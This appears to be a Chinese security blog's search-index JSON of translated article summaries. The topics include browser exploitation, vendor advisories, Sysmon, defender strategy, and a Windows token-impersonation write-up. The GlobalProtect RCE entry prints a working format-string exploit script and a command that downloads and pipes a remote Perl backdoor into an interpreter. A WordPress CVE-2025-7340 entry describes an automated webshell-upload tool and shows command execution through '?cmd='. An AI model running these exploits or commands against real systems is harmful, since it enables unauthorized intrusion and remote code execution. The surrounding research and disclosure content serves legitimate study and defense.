栈转移：使用ntdll中的gadget实现栈转移 ntdll基址泄露：通过kernel32导入表获取ntdll地址 执行原生代码：通过ROP链调用VirtualProtect使shellcode可执行 kaizen.js改进\r提高内存原语可靠性：使用Tenured堆中的ArrayBuffer替代Nursery堆中的对象 动态解析函数地址：通过PE结构解析导出函数地址 JIT gadget生成：强制JIT编译特定函数生成所需ROP gadget ifrit.js高级利用\r编译Firefox：构建64位Firefox用于漏洞研究 配置开发环境：禁用沙箱和多进程模式便于调试 JIT完整payload：通过精心构造的JavaScript函数，使JIT编译器生成完整的原生payload 结论\r本文详细介绍了从基础的漏洞利用到高级的JIT代码重用技术的演进过程。通过三种逐步改进的漏洞利用方法，展示了如何克服现代浏览器安全机制的挑战。虽然这些技术针对特定版本的SpiderMonkey，但其中涉及的概念和方法对理解现代浏览器漏洞利用具有普遍意义。\n完整代码和材料可在blazefox GitHub仓库获取，包括调试扩展、漏洞利用代码、构建的二进制文件和脚本等。\n","date":"2025-08-02T04:33:34+08:00","image":"https://i.imgs.ovh/2025/08/02/HiwQc.png","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E6%8E%A2%E7%B4%A2spidermonkey%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%BB%8E%E5%9F%BA%E7%A1%80%E5%88%B0%E9%AB%98%E7%BA%A7%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/","title":"深入探索SpiderMonkey漏洞利用：从基础到高级浏览器攻击技术"},{"content":"摘要\r谷歌根据协调漏洞披露(CVD)向微软报告了可能影响使用Azure Storage SDK(Python/.NET/Java版)客户端加密功能的填充Oracle漏洞(CVE-2022-30187)。微软已于2022年7月12日发布客户端加密功能v2正式版(GA)进行修复。目前未发现该漏洞在Azure服务中被利用的案例。\n客户影响\r使用受影响版本客户端加密功能的应用需升级至v2版本以确保安全。客户可通过Azure Storage博客中的\u0026quot;如何验证是否使用客户端加密功能\u0026quot;章节确认影响范围。迁移v2需要：a)更新代码使用v2加密方案；b)迁移v1加密数据至v2。替代方案可考虑使用Azure存储服务端加密。\n技术细节\rAzure Storage SDK原v1版本使用CBC分组加密模式，当攻击者具有blob写入权限并能观测解密失败时，可能实施填充Oracle攻击。研究表明攻击者需对每个明文字节执行大量密钥操作才能解密blob内容。微软感谢谷歌通过CVD流程报告该漏洞。\n参考资源\rAzure Storage博客 CVE-2022-30187 技术支持：通过Azure门户提交支持案例(aka.ms/azsupt) ","date":"2025-08-02T04:16:37+08:00","permalink":"http://localhost:1313/p/azure-storage-sdk%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8A%A0%E5%AF%86%E5%A1%AB%E5%85%85oracle%E6%BC%8F%E6%B4%9E%E7%BC%93%E8%A7%A3%E6%96%B9%E6%A1%88/","title":"Azure Storage SDK客户端加密填充Oracle漏洞缓解方案"},{"content":"将防御者的困境转化为防御者的优势\r网络安全防御者处于天然劣势的观点——即所谓的\u0026quot;防御者困境\u0026quot;——不仅是错误的，而且具有反作用。与其只关注如何应对攻击者的策略，我们更应该识别并利用防御者身份的固有优势。本文将阐述防御者思维的内涵，以及它如何帮助强化安全体系。\n什么是防御者困境？\r多年来，安全专业人士一直用\u0026quot;防御者困境\u0026quot;来解释为何企业在防范网络攻击时处于劣势。其核心观点是：\n\u0026ldquo;防御者处于劣势，因为我们必须时刻保持正确，而攻击者只需成功一次。\u0026rdquo;\n按照这种观点，防御者需要关注所有可能的攻击路径并全面防护。我们必须艰难地选择重点防御哪些攻击路径（这就是困境所在），这使我们处于不利地位。这种劣势还源于我们需要全面应对每一次攻击，这意味着有时会漏掉某些攻击。\n防御者困境的概念不仅令人沮丧，而且并不正确。防御者完全可以获得相对于攻击者的优势。\n防御者困境的谬误\r防御者困境之所以是谬误，部分原因在于它过度简化了网络攻击的复杂性。以MITRE ATT\u0026amp;CK框架为例，它展示了攻击者为达成目标必须遵循的多步骤过程。根据ATT\u0026amp;CK，攻击者通常从侦察开始，进展到资源开发，再到初始访问，之后还必须突破多个阶段才能实现目标。\n攻击者必须成功完成每个阶段才能达成任务。而防御者只需干扰其中一个环节就能挫败攻击，迫使攻击者调整策略。行业资深人士Richard Bejtlich早在2009年就在入侵检测背景下观察到这点，创造了\u0026quot;入侵者困境\u0026quot;一词。他指出：\n\u0026ldquo;防御者只需检测到入侵者存在的一个指标，就能在企业内部启动事件响应。\u0026rdquo;\n另一位备受尊敬的网络安全专家David J. Bianco在2023年扩展了这一观点，提出了\u0026quot;攻击者困境\u0026quot;的概念。除了指出\u0026quot;攻击者必须在整个攻击生命周期中都做对\u0026quot;，他还强调：\n\u0026ldquo;攻击者通常在不完全了解目标环境的情况下行动。\u0026rdquo;\n我们的固有优势——防御者优势——在于我们能够比攻击者更深入地了解自身环境。通过前瞻性规划和设计，我们可以创建改变与攻击者互动方式的安全架构。\n获取防御者优势\r防御者困境假设防御者只能被动等待攻击发生然后响应。这种被动立场让攻击者掌握了主动权，使防御者总是处于追赶状态。为改变这种态势，行业分析师强调防御者需要实践\u0026quot;主动安全\u0026quot;。Omdia的Eric Parizo用这个术语鼓励企业：\n\u0026ldquo;在可能的威胁对扩展IT环境构成危险之前，就主动寻找并消除它们。\u0026rdquo;\nForrester的Erik Nost认为，实践主动安全意味着通过强大的可见性、优先级排序和修复来控制安全态势并减少违规。这一过程始于对环境的深入了解，这样我们才能知道需要保护的资源和需要解决的安全弱点。\n地形认知并非网络安全独有，这个概念适用于各个领域的攻击者和防御者，包括历史上的战场。例如，在1450年的阿金库尔战役中，英军将自己部署在两侧有树林的狭窄战场上，将法国骑士引入受限空间。通过收窄战线，英军击败了规模大得多的法军。\n就像阿金库尔战役一样，在网络安全防御中创建瓶颈点是建立防御者优势的一种方式。例如，通过单点登录(SSO)提供商集中SaaS登录，可以让组织应用可靠的安全措施，如双因素认证和异常检测。SSO迫使攻击者通过防御者控制的瓶颈点来攻击SaaS目标，使他们处于劣势。\n更广泛地说，要获得防御者优势，我们应该：\n了解我们的环境：持续更新所有资产的清单，包括硬件、软件、SaaS平台和用户账户。了解每项资源的业务目的。这一基础步骤让我们明确知道需要保护什么以及潜在的安全改进点在哪里。\n最小化攻击面：定期修补漏洞软件，关闭不需要的系统，禁用或停用不需要的服务，并强制使用SSO来减少入口点。这些行动共同减少了潜在的攻击向量数量。\n基于上下文优先修复：根据系统关键性、业务流程和敏感性评估每个漏洞的风险。优先解决最重大的风险。这种有针对性的方法确保资源被有效分配到最高优先级的领域。\n有节制地修复：制定并执行修复计划，以可控和实际的方式实施变更。监控修复工作的进展和效果，使用指标跟踪改进并在需要时干预。这确保安全改进项目能达到预期效果。\n要获得防御者优势，首先需要彻底了解你的环境，这使你能够识别和修复弱点，部署自动化响应措施，并设计将攻击引导至防御最严密环节的架构。通过减少攻击面和优先处理安全改进机会来最小化攻击路径可能。监督修复工作以确保进展。通过从被动思维转向主动思维，彻底扭转攻击者的优势。\n","date":"2025-08-02T03:55:18+08:00","permalink":"http://localhost:1313/p/%E5%B0%86%E9%98%B2%E5%BE%A1%E8%80%85%E7%9A%84%E5%9B%B0%E5%A2%83%E8%BD%AC%E5%8C%96%E4%B8%BA%E9%98%B2%E5%BE%A1%E8%80%85%E7%9A%84%E4%BC%98%E5%8A%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%B0%E6%80%9D%E7%BB%B4/","title":"将防御者的困境转化为防御者的优势：网络安全新思维"},{"content":"工具发布公告：Sysmon v6安全监控工具\rSysmon正在持续进化。\n我们很高兴宣布@markrussinovich和@mxatone已发布Sysmon v6版本。两年前首次讨论Sysmon v2时仅支持7种事件类型，如今已扩展至19种事件类型外加错误事件。从Mark在RSA大会的演示中可以看到新增的3种v6事件类型（已高亮显示）。\nSysmon事件类型\r\u0026ldquo;本次发布的Sysmon作为后台监控工具，可将系统活动记录到事件日志中用于安全事件检测和取证。新版本新增了事件模式显示选项、配置变更事件记录、标准化注册表路径显示，以及命名管道创建和连接事件监控功能。\u0026rdquo;\nMark的演示包含了Sysmon优化运行的基础事件推荐配置：\n基础事件推荐配置\r（图表内容：进程创建/终止、网络连接、文件创建时间变更等核心监控项）\n基础事件推荐配置（续）\r（图表内容：WMI事件、驱动程序加载、跨进程注入等高级监控项）\n强烈建议采用这些推荐配置进行部署。初学者可使用Sysmon配置模板快速上手，如@SwiftOnSecurity在Github提供的sysmon-config-export.xml。该模板特点包括：\n每行配置均有详细注释 按功能分区并附带解释说明 兼具Sysmon教学指南功能 涵盖Windows系统关键监控区域 部署命令示例：\nsysmon.exe -accepteula -i sysmonconfig-export.xml\n实战演示：驱动加载检测\r通过WinPMEM内存取证工具加载内核驱动时，Sysmon准确捕获了Event ID 6（驱动加载）事件：\n1 2 WinPMEM执行命令： winpmem_2.1.post4.exe -l -d winpmem.sys Windows事件查看器对应日志：\nApplications and Services Logs/Microsoft/Windows/Sysmon/Operational\n最后附上Mark提出的Sysmon最佳实践要点：\n全环境部署（包括工作站和服务器） 结合威胁情报优化配置 建立事件响应流程 集中化日志收集与分析 立即部署Sysmon v6，全面提升您的安全监控能力！\n","date":"2025-08-02T03:38:35+08:00","permalink":"http://localhost:1313/p/sysmon-v6-%E5%AE%89%E5%85%A8%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7%E5%8F%91%E5%B8%83%E5%85%AC%E5%91%8A%E5%A2%9E%E5%BC%BAwindows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E8%BF%BD%E8%B8%AA%E8%83%BD%E5%8A%9B/","title":"Sysmon v6 安全监控工具发布公告：增强Windows系统安全事件追踪能力"},{"content":"2017年度回顾 - Trail of Bits博客\r2017年是技术突破的一年！我们在自动化漏洞发现、符号执行和二进制翻译等领域发布了创新研究，并改进了安全研究人员依赖的基础工具。我们在智能合约安全领域扩大影响力，成为顶尖的区块链安全公司。\n创新研究\r自动化漏洞发现进入现实世界\r2017年该领域发展迅猛。我们与洛克希德·马丁和国防部DIUx签订合同，应用我们的网络推理系统(Cyber Reasoning System)。同时我们将CGC挑战二进制文件移植到Windows、macOS和Linux平台，为工具评估提供客观基准。\nManticore提升符号执行工具可用性\r我们开源了高度灵活的符号执行工具Manticore，它已成为DARPA LADS项目的重要组成部分。我们将其应用于以太坊虚拟机(EVM)字节码分析，可自动发现合约函数、生成触发合约状态的交易并检查失败状态。\nMcSema 2.0实现二进制文件近似源代码处理\r我们对二进制翻译工具McSema进行了重大升级：代码清理、性能提升，并分离指令语义与控制流恢复创建Remill库。演示用例包括二进制补丁修改、与KLEE的符号执行，以及重用基于LLVM的工具(如libFuzzer)。\n基础工具\r巩固以太坊基础设施\r我们开发了行业领先的智能合约安全工具套件，包括适配Manticore用于以太坊安全审计。我们加入了企业以太坊联盟(EEA)，并公开了RSK和DappHub Sai的安全审计报告。\nosquery扩展功能边界\r我们在2016年将Facebook的开源终端监控代理移植到Windows后，继续增强osquery框架：重新设计基于auditd的文件完整性监控，添加CCleaner恶意软件检测功能，并创建扩展仓库。\niVerify满足iPhone用户基本需求\r我们发布了包含最全面iOS越狱检测的iVerify库，可检测iOS 10和11的越狱状态，并承诺随iOS更新持续维护。\nAlgo普及自托管VPN服务\r我们2016年发布的自托管个人VPN服务器Algo在2017年获得广泛关注。它采用现代协议和密码，包含最小化软件集，并得到70名Github贡献者的704次提交。\n学习与分享\r推动漏洞缓解措施部署\r我们比较了clang的CFI与Visual Studio的CFG实现，创建了Windows Defender的\u0026quot;Flying Sandbox Monster\u0026quot;——首个Windows平台沙盒化反病毒扫描器，使用Rust框架在AppContainers中隔离不可信应用。\n聚焦Binary Ninja\r我们通过多种方式展示Vector35逆向平台的能力：解释其低级中间语言(LLIL)基础、演示如何开发平台无关工具、分享DEF CON CTF挑战分析模块。\n支持重要事业\r我们赞助UIUC CTF等竞赛，支持GreHack等会议，并赞助Risky Business播客分享安全洞见。\n2018年展望\r我们将继续推进国防部DIUx的Voltron项目、深化区块链安全研究、增强开源项目支持(osquery、Google Santa等)、发布iVerify独立版、优化Algo的易用性，并通过DeepState等工具使先进技术更易获取。\n","date":"2025-08-02T03:22:11+08:00","permalink":"http://localhost:1313/p/2017%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E7%AA%81%E7%A0%B4/","title":"2017年度回顾：自动化漏洞挖掘、符号执行与区块链安全的技术突破"},{"content":"Windows登录会话的过度共享\rWindows的登录会话通常与单个经过身份验证的用户及其令牌绑定。然而对于服务账户而言情况并非如此——在服务加固机制下，同一个登录会话中可能存在多个带有不同服务组的令牌。本文将展示这种共享机制如何破坏服务加固的隔离性（至少对NETWORK SERVICE账户有效），并再次强调S-1-1-0并非安全边界。\n技术核心：LSASS令牌缓存机制\r当LSASS为新登录会话创建令牌时，会存储该令牌以供后续检索。虽然大多数场景下这个机制无显著作用，但在网络认证时会被重新启用。观察AcquireCredentialsHandleAPI的原型时会发现pvLogonID参数，其说明指出：\n\u0026ldquo;指向标识用户的本地唯一标识符(LUID)。此参数为文件系统进程（如网络重定向器）提供。该参数可为NULL。\u0026rdquo;\n拥有TCB权限时，此参数可指定用于网络认证的登录会话ID（从令牌视角看即认证ID）。虽然常规网络认证中令牌无法跨机器跟随，但在本地环回认证场景下，服务端协商获得的令牌将是会话令牌而非调用方令牌。\n利用SMB实现权限提升\r关键线索在于说明中的\u0026quot;网络重定向器\u0026quot;。最易访问且支持本地环回认证的重定向器是什么？SMB协议。它是否提供获取网络认证令牌的原语？命名管道。SMB是否以内核模式进行网络认证从而具备TCB特权？确实如此。\n漏洞复现（Windows 10 1909环境）\r首先需要NETWORK SERVICE权限的PowerShell进程（可通过作者前文方法实现） 创建命名管道并监听连接： 1 2 $pipe = New-NtNamedPipeFile \\\\.\\pipe\\ABC -Win32Path $job = Start-Job { $pipe.Listen() } 通过本地主机访问管道： 1 2 $file = Get-NtFile \\\\localhost\\pipe\\ABC -Win32Path Wait-Job $job | Out-Null 在模拟命名管道时打开RPCSS进程： 1 2 3 $p = Use-NtObject($pipe.Impersonate()) { Get-NtProcess -ProcessId 1152 } 此时获得的访问权限为AllAccess，因为LSASS存储的是该登录会话中首个令牌（即RPCSS进程的令牌）。 技术验证\r检查模拟令牌的组列表可确认该令牌属于RPCSS服务：\n1 2 3 4 $token = Use-NtObject($pipe.Impersonate()) { Get-NtToken -Impersonation } $token.Groups | ? Name -Match Rpcss 输出显示NT SERVICE\\RpcSs组的存在，证实了令牌来源。\n影响范围\r此特性存在于所有登录会话，但普通用户会话的利用价值较低。需注意的是：当以NETWORK SERVICE身份访问管理共享时，实际会以RPCSS服务身份认证，可能访问该服务SID创建的文件。本文仅抛砖引玉，相信读者能发掘更多创造性利用方式。\n","date":"2025-08-02T02:55:08+08:00","permalink":"http://localhost:1313/p/windows%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%9B%BA%E9%9A%94%E7%A6%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"Windows登录会话共享漏洞：突破服务加固隔离的技术分析"},{"content":"今天我们发布了安全公告2458511，通报了利用Internet Explorer漏洞的有限攻击事件。IE9测试版不受影响，而IE6、7、8存在风险。目前发现的攻击仅针对Windows XP系统上的IE6和7版本，IE8用户不会受到成功攻击。本文将解析漏洞原理、说明IE8风险降低的原因，并提供防护建议。\n漏洞原理\rIE在解析HTML时对特定CSS标签组合的内存分配不足，可能导致虚表指针最低有效字节被覆盖。攻击者通过特定模式的内存喷射（heap spray）可能实现代码执行。数据执行保护（DEP）正是防御此类堆喷射攻击的有效手段。\nDEP的防护作用\r当前所有攻击均被DEP阻断。IE8默认启用DEP，早期版本也可手动开启（详见公告）。由于该漏洞非典型释放后使用（use-after-free）类型，攻击者难以绕过DEP防护。现有DEP绕过技术无法直接应用，因为内存破坏属于部分虚表指针覆盖。我们预计任何绕过DEP的利用尝试都将极不稳定（导致IE崩溃），特别是在支持地址空间布局随机化（ASLR）的系统上。\n增强防护措施\r除启用DEP外，最佳解决方案是通过用户自定义CSS文件覆盖网站提供的CSS样式。该方法能阻止所有IE版本进入漏洞代码路径，且应用兼容性风险极低。公告中详细描述了在HKEY_CURRENT_USER注册表项中配置用户CSS的方法。\nEMET的进阶防护\r今年发布的EMET 2.0工具集通过多种安全缓解技术防御漏洞利用。除强制启用DEP外，EMET还包含强制性ASLR和EAT访问过滤（EAF）等防护机制。需注意安装EMET后需单独配置应用防护（详见公告和用户手册）。\n致谢Fermin J. Serna对本问题和EMET工作的贡献。\nMSRC工程团队：Andrew Roths、Jonathan Ness、Chengyun Chu ","date":"2025-08-02T02:33:23+08:00","permalink":"http://localhost:1313/p/dep%E4%B8%8Eemet%E9%98%B2%E6%8A%A4%E6%9C%80%E6%96%B0ie%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"DEP与EMET防护最新IE漏洞攻击的技术解析"},{"content":"攻击SSL VPN系列(一)：Palo Alto GlobalProtect预认证RCE漏洞分析\r作者: Orange Tsai(@orange_8361) 和 Meh Chang(@mehqq_)\nSSL VPN用于保护企业资产免受互联网暴露，但如果SSL VPN本身存在漏洞会怎样？它们暴露在互联网上，被信任为保护内网入口的唯一屏障。一旦SSL VPN服务器被攻破，攻击者就能渗透内网甚至控制所有连接到该VPN的用户！基于其重要性，过去几个月我们启动了对主流SSL VPN产品安全性的研究。\n我们计划分三篇文章发布研究成果。本文将作为首篇，因为它是一个有趣的故事，非常适合作为我们在Black Hat USA和DEFCON演讲的开胃菜：\n《像NSA一样渗透企业内网 - 主流SSL VPN的预认证RCE漏洞！》\n漏洞详情\r这是一个无需认证的简单格式字符串漏洞。sslmgr是处理服务器与客户端SSL握手的SSL网关，通过Nginx反向代理暴露在/sslmgr路径下。\n1 2 3 4 5 6 $ curl https://global-protect/sslmgr \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;clientcert-response\u0026gt; \u0026lt;status\u0026gt;error\u0026lt;/status\u0026gt; \u0026lt;msg\u0026gt;Invalid parameters\u0026lt;/msg\u0026gt; \u0026lt;/clientcert-response\u0026gt; 在参数提取过程中，守护进程会搜索字符串scep-profile-name并将其值作为snprintf格式字符串来填充缓冲区，导致格式字符串攻击。使用%n即可使服务崩溃：\n1 2 3 4 5 POST /sslmgr HTTP/1.1 Host: global-protect Content-Length: 36 scep-profile-name=%n%n%n%n%n... 受影响版本\r根据我们的调查，2018年7月之前的所有GlobalProtect版本均受影响：\nPalo Alto GlobalProtect SSL VPN 7.1.x \u0026lt; 7.1.19 Palo Alto GlobalProtect SSL VPN 8.0.x \u0026lt; 8.0.12 Palo Alto GlobalProtect SSL VPN 8.1.x \u0026lt; 8.1.3 9.x和7.0.x系列不受此漏洞影响。\n漏洞验证方法\r虽然我们知道漏洞位置，但验证并不容易。该格式字符串没有输出，我们无法通过地址泄露来验证。我们选择使用%c作为验证工具：\n1 2 3 4 $ time curl -s -d \u0026#39;scep-profile-name=%9999999c\u0026#39; https://global-protect/sslmgr \u0026gt;/dev/null real 0m1.721s user 0m0.037s sys 0m0.005s 随着%c数量的增加，响应时间相应延长，从而优雅地识别出存在漏洞的SSL VPN。\n漏洞利用\r确定具体版本后，我们通过修改Global Offset Table(GOT)中的strlen指针为system的Procedure Linkage Table(PLT)地址来实现利用：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 #!/usr/bin/python import requests from pwn import * url = \u0026#34;https://sslvpn/sslmgr\u0026#34; cmd = \u0026#34;echo pwned \u0026gt; /var/appweb/sslvpndocs/hacked.txt\u0026#34; strlen_GOT = 0x667788 # 需修改 system_plt = 0x445566 # 需修改 fmt = \u0026#39;%70$n\u0026#39; fmt += \u0026#39;%\u0026#39; + str((system_plt\u0026gt;\u0026gt;16)\u0026amp;0xff) + \u0026#39;c\u0026#39; fmt += \u0026#39;%32$hn\u0026#39; fmt += \u0026#39;%\u0026#39; + str((system_plt\u0026amp;0xffff)-((system_plt\u0026gt;\u0026gt;16)\u0026amp;0xff)) + \u0026#39;c\u0026#39; fmt += \u0026#39;%24$hn\u0026#39; for i in range(40,60): fmt += \u0026#39;%\u0026#39;+str(i)+\u0026#39;$p\u0026#39; data = \u0026#34;scep-profile-name=\u0026#34; data += p32(strlen_GOT)[:-1] data += \u0026#34;\u0026amp;appauthcookie=\u0026#34; data += p32(strlen_GOT+2)[:-1] data += \u0026#34;\u0026amp;host-id=\u0026#34; data += p32(strlen_GOT+4)[:-1] data += \u0026#34;\u0026amp;user-email=\u0026#34; data += fmt data += \u0026#34;\u0026amp;appauthcookie=\u0026#34; data += cmd r = requests.post(url, data=data) 修改完成后，sslmgr就成为我们的webshell，可以通过以下方式执行命令：\n1 $ curl -d \u0026#39;scep-profile-name=curl orange.tw/bc.pl | perl -\u0026#39; https://global-protect/sslmgr Uber案例分析\r在我们确认这不是0day后，调查了全球使用存在漏洞GlobalProtect的大型企业，Uber是其中之一。以vpn.awscorp.uberinternal.com为例：\n从域名推测Uber使用AWS Marketplace的BYOL服务。从登录页面看似乎是8.x版本，最终我们确定版本为8.0.6并成功获取shell。\nUber迅速响应并修复了漏洞，他们给出了详细的漏洞奖励决定说明：\n\u0026ldquo;虽然这是一个无需认证的RCE，但由于该Palo Alto SSL VPN不是员工使用的主要VPN，且部署在AWS而非核心基础设施中，因此整体影响和位置优势较低。\u0026rdquo;\n我们享受整个研究过程并向安全社区反馈，这比漏洞奖励更有价值！\n","date":"2025-08-02T02:11:51+08:00","permalink":"http://localhost:1313/p/%E6%94%BB%E5%87%BBssl-vpn%E7%B3%BB%E5%88%97%E4%B8%80palo-alto-globalprotect%E9%A2%84%E8%AE%A4%E8%AF%81rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A5uber%E4%B8%BA%E4%BE%8B/","title":"攻击SSL VPN系列(一)：Palo Alto GlobalProtect预认证RCE漏洞分析，以Uber为例"},{"content":"内存泄漏来自doh_write_cb函数\r漏洞摘要\rcurl_fuzzer_http发现了一个内存泄漏问题\n受影响版本\rcurl 8.13.0-DEV (x86_64-apple-darwin23.6.0)\nlibcurl/8.13.0-DEV OpenSSL/1.0.2n zlib/1.2.11 libidn2/2.0.4 libpsl/0.19.1 nghttp2/1.55.1 librtmp/2.3\n发布日期: [未发布]\n协议支持: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp ws wss\n功能特性: alt-svc AsynchDNS HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP UnixSockets\n复现步骤\r使用复现程序运行fuzzer\n支持材料/参考\r堆栈跟踪如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ==14==ERROR: LeakSanitizer: detected memory leaks Direct leak of 107 byte(s) in 1 object(s) allocated from: #0 0x55da4969379c in realloc /src/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:82:3 #1 0x55da496ff27b in curl_dbg_realloc /src/curl/lib/memdebug.c:265:9 #2 0x55da497fc6f3 in dyn_nappend /src/curl/lib/dynbuf.c:111:15 #3 0x55da497faee5 in doh_write_cb /src/curl/lib/doh.c:183:6 #4 0x55da497f2636 in cw_out_ptr_flush /src/curl/lib/cw-out.c:224:16 #5 0x55da497f1644 in cw_out_do_write /src/curl/lib/cw-out.c:383:14 #6 0x55da497f0ab6 in cw_out_write /src/curl/lib/cw-out.c:416:14 #7 0x55da497f2f62 in cw_pause_write /src/curl/lib/cw-pause.c:192:14 #8 0x55da497476e1 in Curl_cwriter_write /src/curl/lib/sendf.c:184:10 #9 0x55da497476e1 in cw_download_write /src/curl/lib/sendf.c:312:14 #10 0x55da497415b9 in Curl_cwriter_write /src/curl/lib/sendf.c:184:10 #11 0x55da497415b9 in Curl_client_write /src/curl/lib/sendf.c:92:12 #12 0x55da498363a5 in Curl_http_write_resp /src/curl/lib/http.c:4201:14 #13 0x55da49762635 in Curl_xfer_write_resp /src/curl/lib/transfer.c:862:14 #14 0x55da4975e364 in sendrecv_dl /src/curl/lib/transfer.c:342:14 #15 0x55da4975e364 in Curl_sendrecv /src/curl/lib/transfer.c:441:14 #16 0x55da497250f5 in state_performing /src/curl/lib/multi.c:1733:12 #17 0x55da497250f5 in multi_runsingle /src/curl/lib/multi.c:2423:12 #18 0x55da497222f2 in curl_multi_perform /src/curl/lib/multi.c:2599:16 #19 0x55da496d3e98 in fuzz_handle_transfer(fuzz_data*) /src/curl_fuzzer/curl_fuzzer.cc:419:5 #20 0x55da496d2e47 in LLVMFuzzerTestOneInput /src/curl_fuzzer/curl_fuzzer.cc:97:3 需要传递-runs=100参数，如：/out/curl_fuzzer_http /out/leak-247f5201c537eecc44d9f44dd815fd43f19a8a72 -runs=100，因为并非每次都会出现该问题\n影响\r内存泄漏可能最终导致拒绝服务(DOS)\u0026hellip;\n后续讨论\r报告者认为这可能不是安全问题而是信息性问题 curl团队确认该问题存在于DNS over HTTPS(doh.c)处理过程中，泄漏量小且不频繁 团队提供了修复PR(#16834)并确认已合并 报告者验证修复后确认问题已解决 最终该报告被标记为\u0026quot;Informative\u0026quot;而非安全漏洞 ","date":"2025-08-02T01:29:19+08:00","permalink":"http://localhost:1313/p/curl%E5%BA%93doh_write_cb%E5%87%BD%E6%95%B0%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","title":"curl库doh_write_cb函数内存泄漏漏洞分析"},{"content":"🚨 HT Contact Form Widget \u0026lt;= 2.2.1 - 未授权任意文件上传漏洞(CVE-2025-7340)\rCVE编号: CVE-2025-7340\nCVSS评分: 9.8 (严重)\n📝 漏洞描述\rWordPress插件**HT Contact Form Widget For Elementor Page Builder \u0026amp; Gutenberg Blocks \u0026amp; Form Builder.**在2.2.1及之前版本中，temp_file_upload函数缺少文件类型验证，导致存在任意文件上传漏洞。\n该漏洞允许未认证的攻击者向服务器上传任意文件，可能导致远程代码执行(RCE)。\n⚡ 漏洞利用脚本\r本仓库包含一个Python利用脚本，可自动发现存在漏洞的表单并向目标网站上传Webshell。\n脚本会智能检测所需参数(nonce, form_id, ajax endpoint)，并将PHP Webshell上传至漏洞路径。\n✅ 存在漏洞的表单URL示例:\n1 http://target.com/contact/ ✅ 目标页面必须包含存在漏洞的表单\n📦 环境要求\r运行脚本前需安装以下Python模块:\n1 pip install -r requirements.txt requirements.txt内容:\n1 2 requests colorama � 使用方法\r1 2 3 4 5 6 7 usage: CVE-2025-7340.py [-h] CVE-2025-7340漏洞利用脚本 - 未授权任意文件上传 | 作者: Khaled Alenazi (Nxploited) options: -h, --help 显示帮助信息 -u, --url URL 目标URL 例如 http(s)://target.com 选项说明:\r选项 描述 -h, --help 显示帮助信息 -u, --url URL 目标URL 例如 http(s)://target.com/contact 🐚 Webshell使用说明\r漏洞利用成功后，可通过给定路径访问上传的Webshell。\n附加?cmd=\u0026lt;your_command\u0026gt;参数可执行系统命令。\n✅ 示例:\n1 http://target.com/wp-content/uploads/ht_form/temp/shell.php?cmd=whoami 🖥️ 示例输出\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 开始对目标进行漏洞利用... 获取目标页面... 提取参数... 获取Nonce: 346c441903 AJAX端点: http://nxploit.ddev.site/wp-admin/admin-ajax.php 表单ID: 86 生成Webshell... 上传Webshell，请稍候... [+] 漏洞利用成功! 访问路径: wp-content/uploads/ht_form/temp/687590d90ac1c-shell.php 作者: Khaled Alenazi (Nxploited) - GitHub: https://github.com/Nxploited 🛑 免责声明\r本工具仅用于教育研究目的。\n作者不对代码滥用造成的任何损害负责。\n测试任何系统前请务必获得明确授权。\n👨‍💻 作者\rKhaled Alenazi (Nxploited)\nGitHub: Nxploited\n","date":"2025-08-02T01:12:17+08:00","permalink":"http://localhost:1313/p/wordpress-ht-contact-form%E6%8F%92%E4%BB%B6%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Ecve-2025-7340%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/","title":"WordPress HT Contact Form插件未授权任意文件上传漏洞(CVE-2025-7340)利用分析"},{"content":"Trail of Bits公开披露两个影响Binance阈值签名方案库(tss-lib)及其主要活跃分叉项目的漏洞。受影响代码库包括：\nBinance的tss-lib Clover Network的threshold-crypto Keep Network的keep-ecdsa Swingby的tss-lib THORchain的tss-lib ZenGo X的curv 